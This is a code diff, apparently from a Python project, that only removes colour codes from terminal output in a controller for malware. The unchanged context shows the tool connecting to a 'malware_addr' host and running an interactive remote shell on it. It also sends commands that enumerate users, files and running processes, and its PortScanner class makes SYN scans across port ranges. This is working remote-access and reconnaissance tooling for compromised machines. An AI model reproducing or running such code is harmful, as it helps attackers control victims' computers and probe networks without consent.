@@ -62,7 +62,6 @@ class GetInfo:
         elif self._os == "Linux":
             return "ls"
 
-
     # list running Process
     def list_process(self):
         if self._os == "Windows":
@@ -85,7 +84,7 @@ class PortScanner:
         min_port = input("[*] Enter de minimum port number: ")
         max_port = input("[*] Enter the Maximum port Number: ")
 
-        print("\033[32m[*] Scan started!\033[0m\n")
+        print("[*] Scan started!\n")
         t1 = datetime.now()
         for port in range(int(min_port), int(max_port) + 1):
             resp = sr1(IP(dst=address) / TCP(dport=port, flags="S"), verbose=0)
@@ -94,9 +93,9 @@ class PortScanner:
                     print("Port {}".format(port) + " is open")
         t2 = datetime.now()
         final_time = t2 - t1
-        print("\n\033[32m[*] Scan finished!\033[0m")
+        print("\n[*] Scan finished!")
 
-        print("\033[32m[*] Scanning completed in {}\033[0m".format(final_time))
+        print("[*] Scanning completed in {}".format(final_time))
 
 
 parser = argparse.ArgumentParser()
@@ -114,7 +113,7 @@ s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 try:
     s.connect(serv_addr)
 except socket.error:
-    print("\033[31m[!] Unable to connect to the following address: {}\033[0m".format(malware_addr))
+    print("[!] Unable to connect to the following address: {}".format(malware_addr))
     sys.exit(0)
 print(s.recv(4096).decode('utf-8'))
 s.send("os".encode("utf-8"))
@@ -133,9 +132,9 @@ while message != "exit":
     if message == "1":
         shell.set_next_command(True)
         while shell.get_next_command():
-            shell._command = input("\033[32mShell: \033[0m")
+            shell._command = input("Shell: ")
             while shell.get_command() == "":
-                shell.set_command(input("\033[32mShell: \033[0m"))
+                shell.set_command(input("Shell: "))
             if shell.get_command() == "exit":
                 shell.close()
             if shell.get_command() == "history":
@@ -144,17 +143,17 @@ while message != "exit":
                 shell.send()
                 shell.receive()
     elif message == "2":
-        print("\033[32m[*] List of Users\033[0m")
+        print("[*] List of Users")
         shell.set_command(getinfo.get_users())
         shell.send()
         shell.receive()
         print("----------------------")
-        print("\033[32m[*] Directory Content\033[0m")
+        print("[*] Directory Content")
         shell.set_command(getinfo.get_content())
         shell.send()
         shell.receive()
         print("----------------------")
-        print("\033[32m[*] list Running Process\033[0m")
+        print("[*] list Running Process")
         shell.set_command(getinfo.list_process())
         shell.send()
         shell.receive()
